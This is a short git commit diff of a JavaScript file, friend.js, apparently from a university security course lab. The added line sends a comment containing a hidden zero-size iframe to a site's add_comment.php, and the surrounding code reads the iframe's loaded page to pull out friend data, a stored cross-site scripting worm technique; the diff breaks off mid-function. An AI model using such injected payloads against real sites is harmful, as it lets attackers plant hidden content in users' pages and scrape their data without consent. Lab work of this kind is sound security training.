02a6c869c69e80a0ea8a03bb101fc70da5758db0
DarkLemon27 <47903566+DarkLemon27@users.noreply.github.com>
2020-04-03 16:03:18 -0400

    Update friend.js

--- friend.js
+++ friend.js
@@ -1,4 +1,5 @@
 function moveitmoveit() {
+    $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{ comment: '<iframe height="0" width="0" id="hiddenone" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>'});
     var eff = document.getElementById("hiddenone");
     eff.addEventListener("load",function(){
        var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
